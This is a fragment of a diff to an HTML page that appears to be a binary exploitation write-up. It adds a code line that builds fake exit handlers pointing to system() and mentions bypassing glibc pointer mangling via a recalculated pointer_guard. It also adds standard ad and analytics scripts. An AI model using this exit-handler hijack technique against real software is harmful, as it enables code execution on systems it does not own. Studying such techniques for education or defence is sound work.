-<span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="nb">str</span> <span class="p">(</span><span class="n">fake_exit_funcs</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>
+    <span class="n">fake_exit_funcs</span><span class="p">.</span><span class="n">append</span> <span class="p">(</span><span class="n">func_system</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span>
+<span class="n">fake_exit_funcs</span> <span class="o">=</span> <span class="nb">str</span> <span class="p">(</span><span class="n">fake_exit_funcs</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Given you’ve recalculated the proper pointer_guard … pointer mangling is
 bypassed.</p>
@@ -1322,6 +1318,26 @@ It allows you to do an easy version of ROP.</p>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
